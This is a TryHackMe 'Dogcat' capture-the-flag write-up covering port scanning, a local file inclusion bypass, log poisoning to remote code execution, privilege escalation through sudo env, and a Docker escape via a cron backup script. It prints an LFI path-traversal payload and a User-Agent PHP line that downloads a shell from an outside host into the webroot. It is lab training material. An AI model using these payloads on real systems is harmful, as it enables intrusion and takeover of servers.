----------------------

### CTF: TRYHACKME
### Lab: Dogcat

-----------------------

![image](https://github.com/user-attachments/assets/9e026169-7b8f-4b5f-bbd4-64e3fe85b38b)

-----------------------

### RECONNAISSANCE

- Rustscan's output

      ❯ rustscan -a 10.10.144.255 -- -sC -sV
      .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
      | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
      | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
      `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
      The Modern Day Port Scanner.
      ________________________________________
      : https://discord.gg/GFrQsGy           :
      : https://github.com/RustScan/RustScan :
       --------------------------------------
      🌍HACK THE PLANET🌍
      
      [~] The config file is expected to be at "/home/sensei/.rustscan.toml"
      [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
      [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
      Open 10.10.144.255:22
      Open 10.10.144.255:80
      [~] Starting Script(s)
      [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
      
      [~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 16:39 EDT
      NSE: Loaded 156 scripts for scanning.
      NSE: Script Pre-scanning.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:39
      Completed NSE at 16:39, 0.00s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:39
      Completed NSE at 16:39, 0.00s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:39
      Completed NSE at 16:39, 0.00s elapsed
      Initiating Ping Scan at 16:39
      Scanning 10.10.144.255 [2 ports]
      Completed Ping Scan at 16:39, 0.58s elapsed (1 total hosts)
      Initiating Parallel DNS resolution of 1 host. at 16:39
      Completed Parallel DNS resolution of 1 host. at 16:39, 0.39s elapsed
      DNS resolution of 1 IPs took 0.40s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
      Initiating Connect Scan at 16:39
      Scanning 10.10.144.255 [2 ports]
      Discovered open port 22/tcp on 10.10.144.255
      Discovered open port 80/tcp on 10.10.144.255
      Completed Connect Scan at 16:39, 0.36s elapsed (2 total ports)
      Initiating Service scan at 16:39
      Scanning 2 services on 10.10.144.255
      Completed Service scan at 16:39, 6.85s elapsed (2 services on 1 host)
      NSE: Script scanning 10.10.144.255.
      NSE: Starting runlevel 1 (of 3) scan.
      Initiating NSE at 16:39
      NSE Timing: About 99.30% done; ETC: 16:39 (0:00:00 remaining)
      Completed NSE at 16:40, 39.84s elapsed
      NSE: Starting runlevel 2 (of 3) scan.
      Initiating NSE at 16:40
      Completed NSE at 16:40, 1.94s elapsed
      NSE: Starting runlevel 3 (of 3) scan.
      Initiating NSE at 16:40
      Completed NSE at 16:40, 0.00s elapsed
      Nmap scan report for 10.10.144.255
      Host is up, received syn-ack (0.53s latency).
      Scanned at 2024-08-26 16:39:18 EDT for 50s
      
      PORT   STATE SERVICE REASON  VERSION
      22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
      | ssh-hostkey: 
      |   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
      | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
      |   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
      | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
      |   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
      |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
      80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
      |_http-server-header: Apache/2.4.38 (Debian)
      | http-methods: 
      |_  Supported Methods: GET HEAD POST OPTIONS
      |_http-title: dogcat
      Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- Ffuf's output

![image](https://github.com/user-attachments/assets/05a325c9-132b-441d-b130-9cdbd5bc0d3a)

----------------------------

### LFI Bypass

- Checking through the source page, I discovered this `?view=` parameter that takes in the value `dog`. A lot can go wrong here e.g LFI,sqli e.tc. I decided
to test for LFI first, maybe the the `view` word focuses on viewing files. I tried to read the `passwd` file with absolute file `/etc/passwd` but it pops out an error.
 " only cats and dogs files".

![image](https://github.com/user-attachments/assets/c430eb81-09da-4c2e-b17b-6808a907d9fd)

- I focused on the idea that one of the words `dogs` and `cat` must be in the file path.Then,I tried this path

  Path-: ```dogs/../index.php```

![image](https://github.com/user-attachments/assets/3ffbd0e3-8322-48eb-95a5-517d173d9737)

- The code adds an extension to the file path which forces our file name to be `index.php.php`. A workaround willl just be using the characters
`index` only.I got the code contents with `php://filter/convert.base64-encode/resource=` filter to get base64 encoded contents.

![image](https://github.com/user-attachments/assets/d1e0ab90-2bea-4e33-afbb-36610672e863)

### Understanding the code

- Code

       <?php
                  function containsStr($str, $substr) {
                      return strpos($str, $substr) !== false;
                  }
                  $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
                  if(isset($_GET['view'])) {
                      if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                          echo 'Here you go!';
                          include $_GET['view'] . $ext;
                      } else {
                          echo 'Sorry, only dogs or cats are allowed.';
                      }
                  }
              ?>

- The code requires 2 queries `view` and `ext`.`View` receives the filepath and `ext` contains the file path.The code uses the default `.php` if
query `ext` is not added to the request. The code also checks if `dogs` or `cats` is included in the filepath before it passes to include() to include the file.
We can bypass the extension check by setting an empty `ext` query.I tested this by reading `/etc/passwd` and it worked.

 Query-:```?view=dogs/../../../../etc/passwd&ext=```

![image](https://github.com/user-attachments/assets/d3b9719e-2013-45e7-9044-a73cebb922f3)


-------------------------

### LFI2RCE via log poisoning

-  I was able to reed apache log `/var/log/apache2/access.log`

![image](https://github.com/user-attachments/assets/b9b7d0cb-92a4-4bb6-b02b-63638277f0db)

- We can escalate this poisoning the `User-Agent` header of any request. You can use the php shell code to upload your php shell code hosted on a server.Use curl to make it easier,I suggest you upload a pentestmonkey php reverse shell.

Code-:```"User-Agent: <?php file_put_contents('/var/www/html/shell.php',file_get_contents('http://10.8.158.229:8000/shell2.php')) ?>```

![image](https://github.com/user-attachments/assets/f9c6e579-5f00-4faf-b030-74beb655b1b1)


- Reverse shell

![image](https://github.com/user-attachments/assets/ca8bf7ea-4cc7-44b2-aa77-935f7781fc87)

--------------------

### Privesc with `env`

- Running `sudo -l` shows the rule that user `www-data` can run binary `env` as root.

![image](https://github.com/user-attachments/assets/bf0a6f99-464a-40a6-a596-ba129e998f86)

- Root shell

![image](https://github.com/user-attachments/assets/86ab149b-3e09-46f0-bda3-2afb13d60d84)

--------------------------

### Host system's root privesc through docker breakout

- The whole environment is a docker container.I ran this [sh file](https://github.com/stealthcopter/deepce) to enumerate for possible vulnerabiliies to escape the container. The script discovered other mounts in the docker container in `/opt/backups`

![image](https://github.com/user-attachments/assets/eb78f880-30db-4f7b-8cf4-da9a3fb5f151)

- The file `backup.sh` contains a bash code which uses tar to create an tar archive of the container and store it in `/backups/backup.tar`. I figured that it might be a root cron job on the host and added a reverse shell to it.

![image](https://github.com/user-attachments/assets/787d752d-8be8-484b-a0ef-a74589e8a1f1)

- My guess was right,I got a reverse shell from the `host` system's user `root`.

![image](https://github.com/user-attachments/assets/886f2260-47b2-4827-95f4-1d30fd21f5c9)

- Rootttt!!!!....

![image](https://github.com/user-attachments/assets/679e3a13-7816-4d8b-909d-a945ff482a7b)


----------------------

### THANKS FOR READING!!!

-----------------------











  





